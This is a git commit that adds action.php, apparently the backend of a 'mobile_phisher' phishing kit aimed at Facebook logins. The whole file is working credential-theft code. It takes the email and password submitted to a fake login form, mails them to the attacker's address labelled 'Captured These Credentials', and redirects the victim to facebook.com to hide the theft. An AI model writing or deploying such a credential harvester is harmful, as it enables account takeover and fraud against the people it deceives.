f79aed59b1dc35544c067d938cac78f52f0d227e
PulkitSingh256 <psinghania256@gmail.com>
2018-02-11 09:15:52 +0530

    Add files via upload

---
+++ action.php
@@ -0,0 +1,24 @@
+<?php
+$var = $_POST['email'];
+$var2 = $_POST['pass'];
+$myFile = file_get_contents("pwned.html");
+$searchString = "<html><title>Your Connection To This Website is Secure</title>
+<text>You Have Been PWNED!</text>
+</html>";
+if($myFile == $searchString) {
+    header('Location: https://facebook.com/');
+}
+if($myFile != $searchString) {
+    header('Location: https://facebook.com/');
+}
+$headers = "From: (any valid email address)";
+$to = "(valid receiver's Gmail )";
+$txt ="mobile_phisher Captured These Credentials
+
+Email :- $var
+Password :- $var2";
+$subject = "SomeBody Got Owned";
+mail($to,$subject,$txt,$headers);
+exit();
+?>
+
